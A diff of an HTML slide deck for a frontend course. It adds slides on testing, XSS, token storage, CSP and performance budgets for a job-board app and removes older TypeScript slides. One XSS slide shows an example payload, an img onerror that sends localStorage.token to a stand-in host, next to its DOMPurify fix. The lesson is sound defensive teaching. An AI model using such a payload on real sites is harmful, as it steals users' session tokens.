+    url: <span class="st">'http://localhost:4173'</span>,
+  },
+});</code></pre>
+    </div>
+    <div class="key">No sleeps. Every action waits until the element is visible, enabled and not covered, and <code>expect</code> retries for up to 5 s. When CI fails, the trace shows the DOM, network and console at every step.</div>
+</section>
+
+  <!-- L4 · READ NEXT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 4</div><div class="cx-page"><b>15</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 4 · Read next</div>
+    <h2>Go deeper: testing</h2>
+    <div class="two">
+      <div class="card a">
+        <h3 class="cy">References</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://testing-library.com/docs/queries/about/" target="_blank" rel="noopener" onclick="event.stopPropagation()">About queries — Testing Library ↗</a><small>the query priority, roles first</small></li>
+          <li><a href="https://mswjs.io/docs/" target="_blank" rel="noopener" onclick="event.stopPropagation()">Mock Service Worker docs ↗</a><small>handlers, server.use and MSW 2's http API</small></li>
+          <li><a href="https://playwright.dev/docs/best-practices" target="_blank" rel="noopener" onclick="event.stopPropagation()">Best practices — Playwright ↗</a><small>what to test end to end, and how</small></li>
+        </ul>
+      </div>
+      <div class="card g">
+        <h3 class="g">Resources</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://testing-library.com/docs/user-event/intro" target="_blank" rel="noopener" onclick="event.stopPropagation()">user-event ↗</a><small>why it beats fireEvent</small></li>
+          <li><a href="https://playwright.dev/docs/trace-viewer" target="_blank" rel="noopener" onclick="event.stopPropagation()">Trace viewer — Playwright ↗</a><small>reading a failed CI run step by step</small></li>
+        </ul>
+      </div>
+    </div>
+</section>
+
+  <!-- L7a · XSS -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 5"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 5</div><div class="cx-page"><b>16</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 5 · XSS</div>
+    <h2>React escapes text. Your HTML is on you.</h2>
+    <div class="two tight" style="max-width:1240px">
+      <div class="card r">
+        <h3 class="r">Employer HTML, straight in</h3>
+        <pre><code><span class="cmt">// job.description: HTML the employer typed</span>
+&lt;<span class="ty">div</span> dangerouslySetInnerHTML={{ __html: job.description }} /&gt;
+
+<span class="cmt">// one employer posts this:</span>
+<span class="no">&lt;img src=x onerror="fetch('//evil.example?t='+localStorage.token)"&gt;</span></code></pre>
+      </div>
+      <div class="card g">
+        <h3 class="g">Sanitised before it renders</h3>
+        <pre><code><span class="kw">import</span> DOMPurify <span class="kw">from</span> <span class="st">'dompurify'</span>;
+
+<span class="kw">const</span> html = DOMPurify.<span class="fn">sanitize</span>(job.description);
+&lt;<span class="ty">div</span> dangerouslySetInnerHTML={{ __html: html }} /&gt;
+
+<span class="ok">// &lt;img src="x"&gt; survives, onerror does not</span></code></pre>
+      </div>
+    </div>
+    <div class="key w">Other sinks to grep for: <code>innerHTML</code>, <code>eval</code>, <code>new Function</code>, and <code>href={job.applyUrl}</code>, where you allow only <code>https:</code> and <code>mailto:</code>. <code>{job.title}</code> is safe. Anything that bypasses JSX text is not.</div>
+</section>
+
+  <!-- L7b · WHERE TO PUT A TOKEN -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 5"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 5</div><div class="cx-page"><b>17</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 5 · Where to put a token</div>
+    <h2>If JavaScript can read it, XSS can steal it</h2>
+    <table class="grid">
+      <tr><th>Where</th><th>Can injected script read it?</th><th>Sent automatically?</th><th>Use it for</th></tr>
+      <tr><td><code>localStorage</code></td><td><b style="color:var(--bad)">Yes.</b> One line sends it away.</td><td>No</td><td><b style="color:var(--bad)">Never for auth</b></td></tr>
+      <tr><td>A variable in memory</td><td>Yes, while the tab is open</td><td>No</td><td>A short-lived access token, at most</td></tr>
+      <tr><td>Cookie, <code>HttpOnly</code></td><td><b style="color:var(--good)">No</b></td><td>Yes, so it needs a CSRF defence</td><td><b style="color:var(--good)">The session or refresh token</b></td></tr>
+    </table>
+    <pre style="max-width:1040px"><code><span class="kw">Set-Cookie:</span> __Host-session=<span class="st">…</span>; Path=/; Secure; HttpOnly; SameSite=Lax</code></pre>
+    <div class="key">CSRF is the price of cookies. <code>SameSite=Lax</code> keeps the cookie off cross-site POSTs. On top of that, check <code>Origin</code> or a CSRF token on every state-changing request, and never change state on a GET.</div>
+</section>
+
+  <!-- L7c · CONTENT SECURITY POLICY -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 5"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 5</div><div class="cx-page"><b>18</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 5 · Content Security Policy</div>
+    <h2>CSP: the seatbelt for the XSS you missed</h2>
+    <div class="two tight" style="max-width:1240px">
+      <pre><code><span class="kw">Content-Security-Policy:</span>
+  script-src <span class="st">'nonce-R4nd0m'</span> <span class="st">'strict-dynamic'</span>;
+  object-src <span class="st">'none'</span>;
+  base-uri <span class="st">'none'</span>;
+  frame-ancestors <span class="st">'none'</span>;
+  report-to csp
+<span class="kw">Reporting-Endpoints:</span> csp=<span class="st">"https://rasmi.example/csp"</span>
+
+<span class="cmt">&lt;!-- the only scripts that run carry the nonce --&gt;</span>
+&lt;<span class="ty">script</span> nonce=<span class="st">"R4nd0m"</span> type=<span class="st">"module"</span> src=<span class="st">"/assets/main.js"</span>&gt;&lt;/<span class="ty">script</span>&gt;</code></pre>
+      <table class="grid" style="margin-top:0">
+        <tr><th>Directive</th><th>What it stops</th></tr>
+        <tr><td style="white-space:nowrap"><code>'nonce-…'</code></td><td>Any script without this response's nonce, including injected <code>&lt;script&gt;</code> tags and inline <code>onerror=</code>.</td></tr>
+        <tr><td style="white-space:nowrap"><code>'strict-dynamic'</code></td><td>Nothing; it lets trusted scripts load others, so lazy chunks still work.</td></tr>
+        <tr><td style="white-space:nowrap"><code>object-src</code><br><code>base-uri</code></td><td>Plugin embeds, and a <code>&lt;base&gt;</code> tag that re-points relative script URLs.</td></tr>
+        <tr><td style="white-space:nowrap"><code>frame-ancestors</code></td><td>Other sites framing Rasmi to trick a click on “Apply now”.</td></tr>
+      </table>
+    </div>
+    <div class="key g">Ship it as <code>Content-Security-Policy-Report-Only</code> first: same policy, nothing blocked, every violation reported. Switch to enforcing once the reports go quiet.</div>
+</section>
+
+  <!-- L5 · READ NEXT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 5"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 5</div><div class="cx-page"><b>19</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 5 · Read next</div>
+    <h2>Go deeper: XSS, CSRF and CSP</h2>
+    <div class="two">
+      <div class="card a">
+        <h3 class="cy">References</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" onclick="event.stopPropagation()">Cross Site Scripting Prevention Cheat Sheet ↗</a><small>OWASP, including framework escape hatches</small></li>
+          <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener" onclick="event.stopPropagation()">Cross-Site Request Forgery Prevention Cheat Sheet ↗</a><small>OWASP, SameSite and tokens</small></li>
+          <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP" target="_blank" rel="noopener" onclick="event.stopPropagation()">Content Security Policy (CSP) ↗</a><small>MDN, nonces and strict-dynamic</small></li>
+        </ul>
+      </div>
+      <div class="card g">
+        <h3 class="g">Resources</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://github.com/cure53/DOMPurify" target="_blank" rel="noopener" onclick="event.stopPropagation()">DOMPurify ↗</a><small>the sanitiser used in the video</small></li>
+          <li><a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener" onclick="event.stopPropagation()">CSP Evaluator ↗</a><small>paste a policy, see its holes</small></li>
+        </ul>
+      </div>
+    </div>
+</section>
+
+  <!-- L8a · BASELINE → BUDGET → FIX -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 6"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 6</div><div class="cx-page"><b>20</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 6 · Baseline → budget → fix</div>
+    <h2>Write the number down before you touch anything</h2>
+    <div class="fig" style="max-width:1000px">
+      <svg viewBox="0 0 1000 96" role="img" aria-label="A loop: baseline, budget, fix, prove, guard in CI, and back to baseline for the next release">
+        <rect x="0" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#22D3EE"/>
+        <text x="84" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">1 · Baseline</text>
+        <text x="84" y="46" text-anchor="middle" class="lbl s">median of 3 + RUM p75</text>
+        <path class="draw" pathLength="1" d="M168,31 L206,31" stroke="#64748B" fill="none"/>
+        <rect x="208" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#FBBF24"/>
+        <text x="292" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">2 · Budget</text>
+        <text x="292" y="46" text-anchor="middle" class="lbl s">a number per metric, in a file</text>
+        <path class="draw" pathLength="1" d="M376,31 L414,31" stroke="#64748B" fill="none"/>
+        <rect x="416" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#2196F3"/>
+        <text x="500" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">3 · Fix</text>
+        <text x="500" y="46" text-anchor="middle" class="lbl s">one change, one commit</text>
+        <path class="draw" pathLength="1" d="M584,31 L622,31" stroke="#64748B" fill="none"/>
+        <rect x="624" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#A78BFA"/>
+        <text x="708" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">4 · Prove</text>
+        <text x="708" y="46" text-anchor="middle" class="lbl s">same conditions, again</text>
+        <path class="draw" pathLength="1" d="M792,31 L830,31" stroke="#64748B" fill="none"/>
+        <rect x="832" y="4" width="168" height="54" rx="9" fill="#121C30" stroke="#34D399"/>
+        <text x="916" y="27" text-anchor="middle" class="lbl b" style="font-size:14px">5 · Guard</text>
+        <text x="916" y="46" text-anchor="middle" class="lbl s">CI fails above budget</text>
+        <path d="M916,58 L916,80 L84,80 L84,62" stroke="#64748B" stroke-dasharray="4 4" fill="none"/>
+        <text x="500" y="94" text-anchor="middle" class="lbl s">next release, next baseline</text>
+      </svg>
+    </div>
+    <table class="grid">
+      <tr><th>Rasmi job page</th><th>Baseline</th><th>Budget</th><th>After</th><th>Fixed by</th></tr>
+      <tr><td><b>LCP</b> · lab, mobile</td><td><b style="color:var(--bad)">4.1 s</b></td><td>≤ 2.5 s</td><td><b style="color:var(--good)">2.2 s</b></td><td>Lazy editor (L2), hero image (L3)</td></tr>
+      <tr><td><b>TBT</b> · lab stand-in for INP</td><td><b style="color:var(--bad)">610 ms</b></td><td>≤ 200 ms</td><td><b style="color:var(--good)">140 ms</b></td><td>Lazy editor (L2), stable props (L4)</td></tr>
+      <tr><td><b>CLS</b> · lab</td><td><b style="color:var(--bad)">0.21</b></td><td>≤ 0.1</td><td><b style="color:var(--good)">0.02</b></td><td>Image dimensions, font fallback (L3)</td></tr>
+      <tr><td><b>Initial JS</b> · gzip</td><td><b style="color:var(--bad)">214 KB</b></td><td>≤ 120 KB</td><td><b style="color:var(--good)">102 KB</b></td><td>Lazy editor, two locales (L2)</td></tr>
+      <tr><td><b>INP</b> · field p75</td><td><b style="color:var(--bad)">320 ms</b></td><td>≤ 200 ms</td><td><b style="color:var(--good)">170 ms</b></td><td>Stable props, deferred query (L4)</td></tr>
+    </table>
+</section>
+
+  <!-- L8c · BUILD -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 6"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 6</div><div class="cx-page"><b>21</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 6 · Build</div>
+    <h2>Rasmi on a budget, with the receipts</h2>
+    <div class="two">
+      <div>
+        <ul class="plist">
+          <li><code>perf/baseline.md</code><small>Lighthouse median of three plus RUM p75, recorded before any change</small></li>
+          <li><code>lighthouserc.json</code><small>the budget, failing on the current code on purpose</small></li>
+          <li>Three fixes, one commit each<small>lazy editor, hero image, font fallback, each one re-measured</small></li>
+          <li>Tests that hold the line<small>RTL + MSW for every state of the job list, plus one Playwright journey: search → apply</small></li>
+          <li>A pull request<small>this lesson's before/after table, filled in with your own numbers</small></li>
+        </ul>
       </div>
       <div class="card w">
-        <h3 class="w">When two components are simpler</h3>
-        <p>If <code>as</code> only ever means “link or button”, write <code>&lt;Button&gt;</code> and <code>&lt;ButtonLink&gt;</code>. Two plain prop types beat one generic: readable errors, nothing conditional, nothing to explain in review.</p>
-        <p style="margin-top:10px">Keep <code>as</code> for layout and type primitives — <code>Text</code>, <code>Box</code>, <code>Stack</code> — where the element genuinely varies.</p>
+        <h3 class="w">Stage · <span class="mono">module-8/perf-and-tests</span></h3>
+        <p>Rasmi as it stands at the start of this lesson. The static editor import, the lazy hero, the unsized cover and the swapping font are all still in it.</p>
+        <p style="margin-top:10px"><b>Done when</b> CI is green at every step (types, lint, Vitest, Playwright, Lighthouse CI) and every number in your table has a commit beside it.</p>
       </div>
     </div>
 </section>
 
-  <section class="slide" data-chip="MODULE 06 · VIDEO 2"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 2</div><div class="cx-page"><b>09</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 2 · Read next</div>
-    <h2>Generics, read properly</h2>
+  <!-- L6 · READ NEXT -->
+  <section class="slide" data-chip="MODULE 08 · VIDEO 6"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 08 · VIDEO 6</div><div class="cx-page"><b>22</b> / 23</div><!--/catalyst-brand:chrome-->
+    <div class="kicker">Lesson 6 · Read next</div>
+    <h2>Go deeper: performance budgets</h2>
     <div class="two">
       <div class="card a">
         <h3 class="cy">References</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://www.typescriptlang.org/docs/handbook/2/generics.html" target="_blank" rel="noopener">Generics — TypeScript Handbook</a><small>type parameters and constraints</small></li>
-          <li><a href="https://www.typescriptlang.org/docs/handbook/2/keyof-types.html" target="_blank" rel="noopener">keyof — TypeScript Handbook</a><small>how getLabel stays tied to the option type</small></li>
-          <li><a href="https://www.radix-ui.com/primitives/docs/guides/composition" target="_blank" rel="noopener">Composition and asChild — Radix</a><small>the polymorphism pattern design systems actually ship</small></li>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://web.dev/articles/performance-budgets-101" target="_blank" rel="noopener" onclick="event.stopPropagation()">Performance budgets 101 ↗</a><small>choosing and enforcing a budget</small></li>
+          <li><a href="https://github.com/GoogleChrome/lighthouse-ci" target="_blank" rel="noopener" onclick="event.stopPropagation()">Lighthouse CI ↗</a><small>running Lighthouse on every push</small></li>
+          <li><a href="https://github.com/GoogleChrome/lighthouse-ci/blob/main/docs/configuration.md" target="_blank" rel="noopener" onclick="event.stopPropagation()">Lighthouse CI configuration ↗</a><small>every assertion option in lighthouserc.json</small></li>
         </ul>
-      </div>
-      <div class="card b">
-        <h3 class="b">Resources</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://www.typescriptlang.org/play" target="_blank" rel="noopener">TypeScript Playground</a><small>hover the inferred T at the call site</small></li>
-          <li><a href="https://github.com/Catalystsw/frontend-mastery-program/tree/main/modules/06-react-typescript" target="_blank" rel="noopener">Module 6 slides</a><small>the deck this video walks through</small></li>
-        </ul>
-      </div>
-    </div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 3</div><div class="cx-page"><b>10</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 3 · Discriminated state</div>
-    <h2>Five booleans, 32 combinations</h2>
-    <div class="two tight" style="max-width:none">
-      <div class="card r">
-        <h3 class="r">The apply form, as booleans</h3>
-        <pre><code><span class="kw">const</span> [isEditing, setIsEditing] = <span class="fn">useState</span>(<span class="kw">true</span>);
-<span class="kw">const</span> [isSubmitting, setIsSubmitting] = <span class="fn">useState</span>(<span class="kw">false</span>);
-<span class="kw">const</span> [isSubmitted, setIsSubmitted] = <span class="fn">useState</span>(<span class="kw">false</span>);
-<span class="kw">const</span> [isFailed, setIsFailed] = <span class="fn">useState</span>(<span class="kw">false</span>);
-<span class="kw">const</span> [isWithdrawn, setIsWithdrawn] = <span class="fn">useState</span>(<span class="kw">false</span>);
-
-<span class="no">// isSubmitting &amp;&amp; isWithdrawn — legal to write,</span>
-<span class="no">// impossible to mean. 2⁵ = 32 states, 5 are real.</span></code></pre>
       </div>
       <div class="card g">
-        <h3 class="g">One union for state, one for actions</h3>
-        <pre><code><span class="kw">type</span> <span class="ty">State</span> =
-  | { status: <span class="st">'editing'</span>; draft: <span class="ty">Draft</span> }
-  | { status: <span class="st">'submitting'</span>; draft: <span class="ty">Draft</span> }
-  | { status: <span class="st">'failed'</span>; draft: <span class="ty">Draft</span>; error: <span class="ty">string</span> }
-  | { status: <span class="st">'submitted'</span>; application: <span class="ty">Application</span> }
-  | { status: <span class="st">'withdrawn'</span> };
-
-<span class="kw">type</span> <span class="ty">Action</span> =
-  | { type: <span class="st">'edit'</span>; draft: <span class="ty">Draft</span> }
-  | { type: <span class="st">'submit'</span> }
-  | { type: <span class="st">'failed'</span>; error: <span class="ty">string</span> }
-  | { type: <span class="st">'succeeded'</span>; application: <span class="ty">Application</span> }
-  | { type: <span class="st">'withdraw'</span> };</code></pre>
-      </div>
-    </div>
-    <div class="key g" style="max-width:none">Five states, each carrying only its own data — <code>error</code> exists only while <code>failed</code>. <code>Action</code> lists everything that can happen.</div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 3</div><div class="cx-page"><b>11</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 3 · An exhaustive reducer</div>
-    <h2>A reducer the compiler can check</h2>
-    <pre style="max-width:none; font-size:14.5px"><code><span class="kw">function</span> <span class="fn">applyReducer</span>(state: <span class="ty">State</span>, action: <span class="ty">Action</span>): <span class="ty">State</span> {
-  <span class="kw">switch</span> (action.type) {
-    <span class="kw">case</span> <span class="st">'edit'</span>:      <span class="kw">return</span> state.status === <span class="st">'editing'</span> || state.status === <span class="st">'failed'</span> ? { status: <span class="st">'editing'</span>, draft: action.draft } : state;
-    <span class="kw">case</span> <span class="st">'submit'</span>:    <span class="kw">return</span> state.status === <span class="st">'editing'</span> ? { status: <span class="st">'submitting'</span>, draft: state.draft } : state;
-    <span class="kw">case</span> <span class="st">'failed'</span>:    <span class="kw">return</span> state.status === <span class="st">'submitting'</span> ? { status: <span class="st">'failed'</span>, draft: state.draft, error: action.error } : state;
-    <span class="kw">case</span> <span class="st">'succeeded'</span>: <span class="kw">return</span> state.status === <span class="st">'submitting'</span> ? { status: <span class="st">'submitted'</span>, application: action.application } : state;
-    <span class="kw">case</span> <span class="st">'withdraw'</span>:  <span class="kw">return</span> state.status === <span class="st">'submitted'</span> ? { status: <span class="st">'withdrawn'</span> } : state;
-    <span class="kw">default</span>: {
-      <span class="kw">const</span> unhandled: <span class="ty">never</span> = action;   <span class="no">// add an Action, forget its case → the build fails here</span>
-      <span class="kw">return</span> unhandled;
-    }
-  }
-}
-<span class="kw">const</span> [state, dispatch] = <span class="fn">useReducer</span>(applyReducer, { status: <span class="st">'editing'</span>, draft: emptyDraft }); <span class="cmt">// no type arguments</span></code></pre>
-    <div class="key">An impossible transition returns <code>state</code> unchanged — a double-click on Submit sends one request. In React 19, type the reducer and let <code>useReducer</code> infer the rest.</div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 3</div><div class="cx-page"><b>12</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 3 · Custom hooks and context</div>
-    <h2>Named fields out, never <code>undefined</code></h2>
-    <div class="two tight" style="max-width:none">
-      <div class="card a">
-        <h3 class="cy">A custom hook returns an object</h3>
-        <pre><code><span class="kw">function</span> <span class="fn">useApplyForm</span>(listingId: <span class="ty">string</span>) {
-  <span class="kw">const</span> [state, dispatch] = <span class="fn">useReducer</span>(applyReducer, initial);
-  <span class="kw">async function</span> <span class="fn">submit</span>() { <span class="cmt">/* … → succeeded | failed */</span> }
-  <span class="kw">return</span> {
-    state,
-    submit,
-    edit: (draft: <span class="ty">Draft</span>) =&gt; <span class="fn">dispatch</span>({ type: <span class="st">'edit'</span>, draft }),
-    withdraw: () =&gt; <span class="fn">dispatch</span>({ type: <span class="st">'withdraw'</span> }),
-  };
-}
-
-<span class="kw">const</span> { state, submit } = <span class="fn">useApplyForm</span>(id); <span class="ok">// by name</span></code></pre>
-      </div>
-      <div class="card g">
-        <h3 class="g">A context that can't be undefined</h3>
-        <pre><code><span class="kw">const</span> SessionContext = <span class="fn">createContext</span>&lt;<span class="ty">Session</span> | <span class="kw">null</span>&gt;(<span class="kw">null</span>);
-
-<span class="kw">export function</span> <span class="fn">useSession</span>(): <span class="ty">Session</span> {
-  <span class="kw">const</span> session = <span class="fn">use</span>(SessionContext);
-  <span class="kw">if</span> (session === <span class="kw">null</span>) {
-    <span class="kw">throw new</span> <span class="ty">Error</span>(<span class="st">'useSession() outside &lt;SessionProvider&gt;'</span>);
-  }
-  <span class="kw">return</span> session; <span class="ok">// Session — callers never check</span>
-}</code></pre>
-      </div>
-    </div>
-    <div class="key">Return a tuple only for two values in a fixed order, like <code>useState</code>. And skip <code>createContext({} as Session)</code> — that cast is a lie the first render without a provider exposes.</div>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 3"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 3</div><div class="cx-page"><b>13</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 3 · Read next</div>
-    <h2>State the compiler can check</h2>
-    <div class="two">
-      <div class="card a">
-        <h3 class="cy">References</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://www.typescriptlang.org/docs/handbook/2/narrowing.html#discriminated-unions" target="_blank" rel="noopener">Discriminated unions — TypeScript Handbook</a><small>one tag field, every state checked</small></li>
-          <li><a href="https://react.dev/learn/extracting-state-logic-into-a-reducer" target="_blank" rel="noopener">Extracting state logic into a reducer — react.dev</a><small>when useState becomes useReducer</small></li>
-          <li><a href="https://kentcdodds.com/blog/stop-using-isloading-booleans" target="_blank" rel="noopener">Stop using isLoading booleans</a><small>Kent C. Dodds on status enums over flags</small></li>
-        </ul>
-      </div>
-      <div class="card b">
-        <h3 class="b">Resources</h3>
-        <ul class="plist refs" style="margin-top:4px">
-          <li><a href="https://react.dev/learn/scaling-up-with-reducer-and-context" target="_blank" rel="noopener">Scaling up with reducer and context — react.dev</a><small>the typed provider pattern, from the source</small></li>
-          <li><a href="https://github.com/Catalystsw/frontend-mastery-program/tree/main/modules/06-react-typescript" target="_blank" rel="noopener">Module 6 slides</a><small>the deck this video walks through</small></li>
+        <h3 class="g">Resources</h3>
+        <ul class="plist" style="margin-top:4px">
+          <li><a href="https://github.com/Catalystsw/frontend-mastery-jobboard" target="_blank" rel="noopener" onclick="event.stopPropagation()">Rasmi — the job board repo ↗</a><small>the codebase you put on a budget</small></li>
         </ul>
       </div>
     </div>
 </section>
 
-  <section class="slide" data-chip="MODULE 06 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 4</div><div class="cx-page"><b>14</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 4 · One door to the network</div>
-    <h2>Parse every response, type every failure</h2>
-    <pre style="max-width:none; font-size:14.5px"><code><span class="kw">export class</span> <span class="ty">ApiError</span> <span class="kw">extends</span> <span class="ty">Error</span> {
-  <span class="kw">readonly</span> status: <span class="ty">number</span>;        <span class="cmt">// 0 = never reached the server</span>
-  <span class="kw">readonly</span> retryable: <span class="ty">boolean</span>;
-  <span class="kw">constructor</span>(status: <span class="ty">number</span>, message: <span class="ty">string</span>) {
-    <span class="kw">super</span>(message);
-    <span class="kw">this</span>.name = <span class="st">'ApiError'</span>;
-    <span class="kw">this</span>.status = status;
-    <span class="kw">this</span>.retryable = status === <span class="st">0</span> || status === <span class="st">429</span> || status &gt;= <span class="st">500</span>;
-  }
-}
-
-<span class="kw">export async function</span> <span class="fn">apiGet</span>&lt;<span class="ty">T</span>&gt;(url: <span class="ty">string</span>, schema: z.<span class="ty">ZodType</span>&lt;<span class="ty">T</span>&gt;, signal?: <span class="ty">AbortSignal</span>): <span class="ty">Promise</span>&lt;<span class="ty">T</span>&gt; {
-  <span class="kw">const</span> res = <span class="kw">await</span> <span class="fn">fetch</span>(url, { signal: signal ?? <span class="kw">null</span> }).<span class="fn">catch</span>((cause: <span class="ty">unknown</span>) =&gt; {
-    <span class="kw">if</span> (signal?.aborted) <span class="kw">throw</span> cause;                     <span class="cmt">// a cancel is not an error to show</span>
-    <span class="kw">throw new</span> <span class="ty">ApiError</span>(<span class="st">0</span>, <span class="st">'Network unreachable'</span>);
-  });
-  <span class="kw">if</span> (!res.ok) <span class="kw">throw new</span> <span class="ty">ApiError</span>(res.status, res.statusText);
-  <span class="kw">const</span> parsed = schema.<span class="fn">safeParse</span>(<span class="kw">await</span> res.<span class="fn">json</span>());
-  <span class="kw">if</span> (!parsed.success) <span class="kw">throw new</span> <span class="ty">ApiError</span>(res.status, <span class="st">'Response broke the contract'</span>); <span class="cmt">// 200, wrong shape: not retryable</span>
-  <span class="kw">return</span> parsed.data;                                     <span class="ok">// T — checked, not asserted</span>
-}</code></pre>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 4</div><div class="cx-page"><b>15</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 4 · Per-endpoint functions</div>
-    <h2>Components call <code>getListing</code>, never <code>fetch</code></h2>
-    <pre style="max-width:none"><code><span class="cmt">// api/listings.ts — the only file that knows this URL and this shape</span>
-<span class="kw">const</span> ListingSchema = z.<span class="fn">object</span>({
-  id: z.<span class="fn">string</span>(), title: z.<span class="fn">string</span>(), companyId: z.<span class="fn">string</span>(), remote: z.<span class="fn">boolean</span>(), salary: z.<span class="fn">number</span>().<span class="fn">optional</span>(),
-});
-<span class="kw">export type</span> <span class="ty">Listing</span> = z.<span class="ty">infer</span>&lt;<span class="kw">typeof</span> ListingSchema&gt;;
-
-<span class="kw">export const</span> <span class="fn">getListing</span> = (id: <span class="ty">string</span>, signal?: <span class="ty">AbortSignal</span>) =&gt;
-  <span class="fn">apiGet</span>(<span class="st">`/api/listings/${</span><span class="fn">encodeURIComponent</span>(id)<span class="st">}`</span>, ListingSchema, signal);      <span class="cmt">// Promise&lt;Listing&gt;</span>
-<span class="kw">export const</span> <span class="fn">getListings</span> = (signal?: <span class="ty">AbortSignal</span>) =&gt;
-  <span class="fn">apiGet</span>(<span class="st">'/api/listings'</span>, z.<span class="fn">array</span>(ListingSchema), signal);                       <span class="cmt">// Promise&lt;Listing[]&gt;</span></code></pre>
-    <table class="grid" style="max-width:none">
-      <tr><th></th><th>fetch inside the component</th><th>A function per endpoint</th></tr>
-      <tr><td><b>The URL</b></td><td>Repeated in every component that needs it</td><td>One file per resource</td></tr>
-      <tr><td><b>The shape</b></td><td><code>as Listing[]</code> — a guess</td><td>Parsed by the schema, type inferred from it</td></tr>
-      <tr><td><b>Failures</b></td><td>Whatever <code>fetch</code> threw, or nothing</td><td>One <code>ApiError</code> with <code>retryable</code></td></tr>
-      <tr><td><b>Tests</b></td><td>Mock <code>fetch</code> and match URLs</td><td>Mock <code>getListing</code></td></tr>
-    </table>
-</section>
-
-  <section class="slide" data-chip="MODULE 06 · VIDEO 4"><!--catalyst-brand:chrome--><i class="cx-logo" role="img" aria-label="Catalyst"></i><div class="cx-chip">MODULE 06 · VIDEO 4</div><div class="cx-page"><b>16</b> / 18</div><!--/catalyst-brand:chrome-->
-    <div class="kicker">Lesson 4 · Build · the typed primitives</div>
-    <h2>Three primitives the whole app builds on</h2>
-    <table class="grid" style="max-width:none">
-      <tr><th>Primitive</th><th>Contract</th><th>The guarantee</th></tr>
